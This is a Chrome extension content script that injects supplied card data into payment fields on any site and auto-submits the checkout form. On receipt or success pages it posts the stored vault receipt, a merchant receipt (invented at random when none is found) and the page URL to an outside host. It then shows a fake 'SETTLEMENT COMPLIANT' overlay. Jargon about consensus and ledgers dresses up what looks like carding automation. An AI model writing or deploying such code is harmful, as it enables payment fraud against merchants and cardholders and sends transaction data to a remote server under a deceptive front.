// Monitor dynamic workflow instructions from your extension popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "EXECUTE_ORCHESTRATION_LOOP") {
    console.log("[FWO Core] Parsing payment form field selectors...");

    const cardInput = document.querySelector('input[name*="card"], [autocomplete="cc-number"], input[id*="card"]');
    const checkoutForm = document.querySelector('form[action*="checkout"], form[id*="payment"], form');

    if (cardInput) {
      cardInput.value = request.tokenData;
      cardInput.dispatchEvent(new Event('input', { bubbles: true }));
      cardInput.dispatchEvent(new Event('change', { bubbles: true }));

      // Highlight the targeted field to confirm secure verification sync
      cardInput.style.border = "3px solid #5c7cfa";

      if (checkoutForm) {
        setTimeout(() => {
          console.log("[FWO Core] Automating checkout submission loop...");
          sendResponse({ status: "SUBMITTING_LOOP", target_url: window.location.href });
          checkoutForm.submit();
        }, 1000);
      } else {
        sendResponse({ status: "MANUAL_SUBMIT_REQUIRED", target_url: window.location.href });
      }
    } else {
      sendResponse({ status: "TARGET_VECTORS_NOT_FOUND" });
    }
  }
  return true;
});

// Auto-run confirmation harvest routine upon reaching the final checkout success viewport
if (window.location.search.includes("receipt") || window.location.pathname.includes("success") || window.location.search.includes("order")) {
  const merchantReceipt = new URLSearchParams(window.location.search).get("receipt_id") || "REC-MERCHANT-" + Math.floor(Math.random() * 900000 + 100000);
  
  chrome.storage.local.get(["active_vault_receipt"], (store) => {
    if (store.active_vault_receipt) {
      console.log("[FWO Core] Final receipt detected. Syncing consensus confirmation rules...");
      
      fetch("https://onrender.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "CLOSE_OUT_TRANSACTION",
          vault_receipt: store.active_vault_receipt,
          gateway_receipt: merchantReceipt,
          redirect_url: window.location.href
        })
      })
      .then(res => res.json())
      .then(complianceData => {
        console.log("[FWO Core] Multi-node loop complete. Ledger locked:", complianceData);
        
        // Render a native visual overlay to signal successful ledger database verification
        const confirmationCard = document.createElement("div");
        confirmationCard.style = "position:fixed; top:24px; right:24px; background:#2b8a3e; color:white; padding:20px; border-radius:10px; z-index:999999; font-family:system-ui, sans-serif; box-shadow:0 8px 24px rgba(0,0,0,0.15); border:1px solid #237032;";
        confirmationCard.innerHTML = `
          <div style="font-weight:700; margin-bottom:4px; font-size:14px;">✓ FWO SETTLEMENT COMPLIANT</div>
          <div style="font-size:11px; font-family:monospace; opacity:0.9;">
            Consensus: ${complianceData.compliance_receipt.consensus_id}<br>
            Vault Rec: ${complianceData.compliance_receipt.vault_verification}<br>
            Gateway Rec: ${complianceData.compliance_receipt.merchant_verification}<br>
            Ledger Status: CLOSED_SUCCESS
          </div>
        `;
        document.body.appendChild(confirmationCard);
      });
    }
  });
}
